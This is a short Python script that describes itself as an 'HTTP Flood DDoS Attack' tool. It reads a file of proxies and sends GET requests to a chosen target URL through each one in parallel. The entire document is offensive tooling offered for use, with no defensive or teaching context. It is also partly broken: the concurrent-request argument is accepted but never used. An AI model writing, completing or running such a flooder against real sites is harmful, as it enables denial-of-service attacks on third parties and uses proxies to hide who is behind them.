import requests
from multiprocessing import Pool
import argparse

def send_request(proxy, target, time, request):
    try:
        response = requests.get(target, proxies={'http': proxy, 'https': proxy}, timeout=time)
        print(f'Request sent to {proxy}. Status code: {response.status_code}')
    except:
        print(f'Error sending request to {proxy}')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='HTTP Flood DDoS Attack')
    parser.add_argument('--proxy', required=True, help='Path to the proxy file')
    parser.add_argument('--target', required=True, help='Target URL')
    parser.add_argument('--time', type=int, default=5, help='Request timeout in seconds')
    parser.add_argument('--request', type=int, default=100, help='Number of concurrent requests')
    args = parser.parse_args()

    with open(args.proxy, 'r') as file:
        proxies = file.read().splitlines()

    pool = Pool(processes=len(proxies))
    pool.starmap(send_request, [(proxy, args.target, args.time, args.request) for proxy in proxies])
